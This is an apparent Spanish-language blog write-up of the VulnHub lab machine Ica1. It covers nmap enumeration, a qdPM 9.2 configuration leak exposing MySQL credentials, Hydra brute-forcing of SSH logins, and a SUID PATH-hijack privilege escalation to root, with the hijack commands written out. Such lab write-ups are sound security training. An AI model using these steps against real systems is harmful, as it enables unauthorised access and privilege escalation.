---
layout: single
title: Ica1 - VulnHub
excerpt: "Ica-1 es una máquina vulnerable de VulnHub que presenta una vulnerabilidad que nos permite visualizar archivos críticos de la configuración a través de la base de datos MySQL. Una vez dentro de la base de datos, identificamos una tabla que contiene usuarios y contraseñas, que exploramos con Hydra para verificar la validez de las credenciales. La escalada de privilegios se basa en un mal manejo al llamar a programas."
date: 2023-11-13
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Ica-1 es una máquina vulnerable de VulnHub que presenta una vulnerabilidad que nos permite visualizar archivos críticos de la configuración a través de la base de datos MySQL. Una vez dentro de la base de datos, identificamos una tabla que contiene usuarios y contraseñas, que exploramos con Hydra para verificar la validez de las credenciales. La escalada de privilegios se basa en un mal manejo al llamar a programas.


## Enumeracion

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Tue Nov  7 12:30:25 2023 as: nmap -sCV -p22,80,3306,33060 -oN vulnscan.nmap 192.168.56.22
Nmap scan report for 192.168.56.22
Host is up (0.00034s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e77d9cbf80541b9e44571c101acda93 (RSA)
|   256 4051934bf83785fda5f4d727416ca0a5 (ECDSA)
|_  256 098560c535c14d837693fbc7f0cd7b8e (ED25519)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: qdPM | Login
3306/tcp  open  mysql   MySQL 8.0.26
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 41
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, ConnectWithDatabase, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, LongColumnFlag, SupportsCompression, LongPassword, SwitchToSSLAfterHandshake, Support41Auth, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: S.oCJWT`/1Ajkw{"\x01%n\x02
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=11/7%Time=654A5818%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
MAC Address: 08:00:27:91:CD:A8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  7 12:30:40 2023 -- 1 IP address (1 host up) scanned in 15.02 seconds
```


## Analisis 

Empezamos por enumerar el puerto 80(http), y notamos que esta corriendo un **qdPM 9.2***.


![](/assets/images/vulnhub-writeup-ica1/ica1-version.png)

Si buscamos exploits para el servicio, vemos uno muy interesante.

![](/assets/images/vulnhub-writeup-ica1/ica1-exploitsearch.png)

El exploits informa que qdPM expone un archivo que contiene información sobre la base de datos.

![](/assets/images/vulnhub-writeup-ica1/ica1-sql.png)

Pasamos a conectarnos.

![](/assets/images/vulnhub-writeup-ica1/ica1-conectarmysql.png)

Copiamos las palabras seleccionadas por el cuadro rojo en dos archivos distintos. Los valores de password, lo tenemos que decodificar.

![](/assets/images/vulnhub-writeup-ica1/ica1-base64.png)

Tendria que quedarnos de la siguiente manera. con tr hacemos que todas las palabras con mayusculas pasen a minusculas.


![](/assets/images/vulnhub-writeup-ica1/ica1-contraseñas.png)

Utilizaremos hydra para identificar que credenciales son correctas.

![](/assets/images/vulnhub-writeup-ica1/ica1-fuerzaBruta.png)

## Shell- Travis

Al ingresar al sistema, ejecutamos el siguiente comando.

```bash
travis@debian:/home$ find / -perm -4000 2>/dev/null
/opt/get_access
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

El archivo con nombre **/opt/get_access** me llama la atención. Por lo que le procedo analizarlo con la herramienta "strings".

![](/assets/images/vulnhub-writeup-ica1/ica1-cat.png)

Vemos algo muy interesante, esta haciendo un mal llamado al programa cat, que esto efectua un PATH HIJACKING.Ejecutamos los siguientes comandos.

```bash
travis@debian:/dev/shm$ export PATH=.:$PATH
travis@debian:/dev/shm$ chmod +x cat
travis@debian:/dev/shm$ strings cat
#!/bin/sh
sh
travis@debian:/dev/shm$ 
```

Ahora ejecutamos el script.

![](/assets/images/vulnhub-writeup-ica1/ica1-root.png)
